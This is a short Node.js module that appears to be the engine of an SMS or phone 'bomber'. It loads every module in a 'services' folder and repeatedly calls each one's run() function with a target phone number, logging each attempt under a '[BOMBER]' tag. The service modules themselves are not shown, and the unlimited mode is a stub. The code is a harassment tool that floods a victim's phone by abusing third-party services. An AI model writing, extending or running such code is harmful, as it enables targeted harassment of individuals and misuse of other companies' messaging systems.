
const tymlogger = require('tymlogger');
const fs = require('fs');
const path = require('path');

const { write, error } = new tymlogger();

const start = (phone, count = 'infinity', done) => {
    write('[BOMBER] init services...');

    const services = [];
    const files = fs.readdirSync(path.join(__dirname, 'services'));

    for (let file of files) {
        const name = file.replace('.js', '');
        services[name] = require(`./services/${name}`);
    }

    write(`[BOMBER] find ${files.length} services`)

    if (count !== 'infinity') {
        for (let i = 0; i <= count; i++) {
            for (let service in services) {
                try {
                    write(`[BOMBER] [${i}] ${phone} => ${services[service].url}`);
                    services[service].run(phone.split('+')[1]);
                } catch (e) {
                    error(`[BOMBER] [${i}] ${phone} => ${services[service].url} FAILED`);
                }
            }
        }
        done();
    } else {
        console.log('[to do]');
        done();
    }
}

const getCountOfServices = () => {
    const files = fs.readdirSync(path.join(__dirname, 'services'));

    return files.length;
}

module.exports = { start, getCountOfServices };
